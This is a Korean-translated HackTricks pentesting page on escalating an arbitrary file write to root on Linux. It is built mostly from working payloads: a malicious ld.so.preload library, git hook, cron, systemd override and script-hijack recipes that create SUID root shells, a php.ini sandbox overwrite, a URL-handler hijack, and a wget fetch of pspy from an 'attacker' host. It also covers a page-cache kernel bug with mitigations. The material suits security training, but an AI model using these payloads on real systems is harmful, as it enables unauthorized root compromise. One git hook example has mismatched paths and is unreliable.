# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

이 파일은 **`LD_PRELOAD`** env variable처럼 동작하지만 **SUID binaries**에서도 작동합니다.\
이 파일을 만들거나 수정할 수 있다면, 실행되는 각 binary와 함께 로드될 **library의 path**를 그냥 추가할 수 있습니다.

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)는 git repository에서 commit이 생성되거나 merge될 때처럼 다양한 **이벤트**에서 **실행되는** **scripts**입니다. 따라서 **권한이 높은 script나 user**가 이런 작업을 자주 수행하고, **`.git` folder에 write**할 수 있다면, 이를 **privesc**에 사용할 수 있습니다.

예를 들어, git repo의 **`.git/hooks`**에 **script를 생성**하면 새 commit이 생성될 때마다 항상 실행되도록 할 수 있습니다:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

root가 실행하는 cron 관련 파일에 **write**할 수 있다면, 다음에 그 job이 실행될 때 보통 code execution을 얻을 수 있습니다. 흥미로운 대상은 다음과 같습니다:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` 또는 `/var/spool/cron/crontabs/`에 있는 root의 crontab 자체
- `systemd` timers와 그들이 트리거하는 services

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
일반적인 악용 경로:

- **새로운 root cron job을 추가** to `/etc/crontab` or a file in `/etc/cron.d/`
- **이미 `run-parts`에 의해 실행되는 script를 교체**
- **실행하는 script 또는 binary를 수정하여 기존 timer target을 백도어**

최소 cron payload 예시:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts`에서 사용하는 cron 디렉터리 안에만 쓸 수 있다면, 대신 거기에 실행 가능한 파일을 하나 떨어뜨리세요:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts`는 보통 점이 포함된 파일명을 무시하므로, `backup.sh` 대신 `backup` 같은 이름을 사용하는 것이 좋습니다.
- 일부 배포판은 classic cron 대신 `anacron` 또는 `systemd` timers를 사용하지만, 악용 아이디어는 동일합니다: **root가 나중에 실행할 내용을 수정**하는 것입니다.

### Service & Socket files

`systemd` unit files 또는 그들이 참조하는 파일에 쓸 수 있다면, unit을 reload하고 restart하거나 service/socket activation path가 트리거되기를 기다려 root로 code execution을 얻을 수 있을 수 있습니다.

흥미로운 대상은 다음과 같습니다:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf`의 Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`에서 참조되는 service scripts/binaries
- root service가 로드하는 writable `EnvironmentFile=` 경로

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
일반적인 악용 경로:

- **`ExecStart=`를 덮어쓰기**: 수정할 수 있는 root 소유 서비스 unit에서
- **drop-in override 추가**: 악성 `ExecStart=`를 넣고 먼저 기존 것을 지우기
- **이미 unit에서 참조하는 script/binary에 백도어 심기**
- **socket-activated service 하이재킹**: socket이 connection을 받으면 시작되는 대응하는 `.service` file을 수정하기

예시 악성 override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
일반적인 활성화 흐름:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
서비스를 직접 재시작할 수는 없지만 socket-activated unit을 수정할 수 있다면, backdoored service의 실행을 root로 트리거하기 위해 **클라이언트 연결을 기다리기만** 하면 될 수 있습니다.

### 권한이 있는 PHP sandbox에서 사용되는 restrictive `php.ini` 덮어쓰기

일부 custom daemon은 `php`를 **restricted `php.ini`** 와 함께 실행하여 user-supplied PHP를 검증합니다(예: `disable_functions=exec,system,...`). sandboxed code에 여전히 **어떤 write primitive**(예: `file_put_contents`)가 남아 있고 daemon이 사용하는 **정확한 `php.ini` 경로**에 접근할 수 있다면, 그 config를 **덮어써서** 제한을 해제한 뒤 elevated privileges로 실행되는 두 번째 payload를 제출할 수 있습니다.

일반적인 흐름:

1. 첫 번째 payload가 sandbox config를 덮어씁니다.
2. 두 번째 payload가 dangerous functions가 다시 활성화된 후 code를 실행합니다.

최소 예제(daemon이 사용하는 경로로 바꾸세요):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
데몬이 root로 실행되거나 root가 소유한 경로로 검증한다면, 두 번째 실행은 root 컨텍스트를 얻게 됩니다. 이는 sandboxed runtime이 여전히 파일을 쓸 수 있을 때의 **config overwrite를 통한 privilege escalation**입니다.

### binfmt_misc

`/proc/sys/fs/binfmt_misc`에 있는 파일은 어떤 binary가 어떤 종류의 파일을 실행할지 나타냅니다. TODO: 일반적인 파일 유형이 열릴 때 rev shell을 실행하도록 이를 악용하는 데 필요한 요구 사항을 확인하세요.

### Overwrite schema handlers (like http: or https:)

공격자가 피해자의 configuration 디렉터리에 대한 write 권한을 가지고 있으면 시스템 동작을 바꾸는 파일을 쉽게 대체하거나 생성할 수 있고, 그 결과 의도하지 않은 code execution이 발생합니다. `$HOME/.config/mimeapps.list` 파일을 수정해 HTTP 및 HTTPS URL handlers를 악성 파일로 지정하면(예: `x-scheme-handler/http=evil.desktop`로 설정), 공격자는 **http 또는 https 링크를 클릭할 때마다 `evil.desktop` 파일에 지정된 code가 실행되도록** 만들 수 있습니다. 예를 들어, 다음 malicious code를 `$HOME/.local/share/applications`의 `evil.desktop`에 넣으면, 외부 URL을 클릭할 때마다 포함된 명령이 실행됩니다:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
더 많은 정보는 실제 취약점을 익스플로잇하는 데 사용된 [**이 게시물**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)을 확인하세요.

### Root executing user-writable scripts/binaries

권한이 있는 워크플로우가 `/bin/sh /home/username/.../script` 같은 것을 실행하거나(또는 unprivileged user가 소유한 디렉터리 내부의 어떤 binary를 실행하면), 이를 hijack할 수 있습니다:

- **실행 감지:** [pspy](https://github.com/DominicBreuker/pspy)로 processes를 모니터링해 root가 user-controlled paths를 호출하는 것을 포착합니다:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **쓰기 가능성 확인:** 대상 파일과 그 디렉터리가 모두 내 사용자에게 소유되었고 쓰기 가능한지 확인한다.
- **대상 하이재킹:** 원본 binary/script를 백업하고 SUID shell(또는 다른 root 작업)을 생성하는 payload를 떨어뜨린 다음, permissions를 복원한다:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **권한 있는 작업을 트리거**하세요** (예: helper를 spawn하는 UI 버튼을 누르기). root가 hijacked path를 다시 실행하면, `./rootshell -p`로 escalated shell을 확보하세요.

### privileged binaries의 page-cache-only file modification

일부 kernel bug는 파일을 **disk**에서 수정하지 않습니다. 대신 읽을 수 있는 파일의 **page cache copy**만 수정할 수 있게 합니다. **setuid** 또는 다른 방식으로 **root-executed** 되는 binary를 target으로 삼을 수 있다면, 다음 실행에서 disk의 file hash는 변하지 않은 채 memory에서 attacker-controlled bytes가 실행되어 privileges가 escalation될 수 있습니다.

이것은 **runtime-only file write primitive**로 생각하는 것이 유용합니다:

- **Disk stays clean**: inode와 on-disk bytes는 변하지 않음
- **Memory is dirty**: cached page를 읽거나 실행하는 process가 attacker-modified content를 보게 됨
- **Effect is temporary**: reboot 또는 cache eviction 후 변경이 사라짐

이 primitive는 classic **arbitrary file write**와 Dirty COW / Dirty Pipe 같은 오래된 **page-cache abuse** bug의 중간쯤에 있습니다:

- Dirty COW는 race에 의존했고
- Dirty Pipe는 write-position constraint가 있었고
- page-cache-only primitive는 vulnerable path가 cached file-backed pages에 직접 write를 허용한다면 더 reliable할 수 있습니다

#### Generic privesc flow

1. **file-backed page cache pages**에 write할 수 있는 kernel primitive를 얻습니다
2. 이를 **readable privileged binary** 또는 다른 root-executed file에 사용합니다
3. page가 cache에서 evicted되기 **전에** execution을 트리거합니다
4. on-disk file은 여전히 수정되지 않은 것처럼 보이지만 root로 code execution을 얻습니다

Typical high-value targets:

- **setuid-root** binaries
- **root services**에 의해 launched 되는 helpers
- host kernel/page cache를 공유하는 **containers**에서 흔히 실행되는 binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431)는 이 class의 좋은 예입니다. vulnerable path는 Linux crypto userspace API (`AF_ALG` / `algif_aead`)에 있었습니다:

- `splice()`는 readable file에서 page-cache pages에 대한 references를 crypto TX scatterlist로 옮길 수 있습니다
- in-place `algif_aead` decrypt path는 source와 destination buffers를 재사용했습니다
- `authencesn`이 destination tag region에 write했습니다
- 그 region이 여전히 spliced file-backed pages를 참조하고 있었다면, write는 target file의 **page cache**에 도착했습니다

따라서 흥미로운 technique는 CVE 자체가 아니라 pattern입니다:

- **file-backed cache pages를 kernel subsystem에 feed**하고
- subsystem이 이를 writable output으로 **취급하게 만들고**
- memory에서 작고 제어된 overwrite를 트리거합니다

public PoC는 repeated **4-byte writes**를 사용해 memory에서 `/usr/bin/su`를 patch한 뒤 이를 실행했습니다.

#### Exposure and hunting

이 class의 bug를 의심한다면 disk integrity checks에만 의존하지 마세요. 또한 확인하세요:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`는 모듈로 load/unload될 수 있음
- `CONFIG_CRYPTO_USER_API_AEAD=y`: 인터페이스가 kernel에 built-in됨
- setuid binaries는 좋은 대상인데, page-cache-only patch만으로도 local foothold를 root로 바꾸기에 충분할 수 있기 때문임

#### `algif_aead` 경로에 대한 Attack-surface reduction

취약한 인터페이스가 loadable module로 제공되는 경우:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
커널에 컴파일되어 있다면, 일부 disclosures는 init 경로를 다음과 같이 차단한다고 보고합니다:
```bash
initcall_blacklist=algif_aead_init
```
이런 종류의 완화책은 다른 kernel LPE에도 기억해둘 만하다: exploitation이 특정 optional interface에 의존한다면, 그 interface를 비활성화하거나 blacklisting하는 것만으로도 전체 kernel upgrade가 가능해지기 전이라도 exploit 경로를 막을 수 있다.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
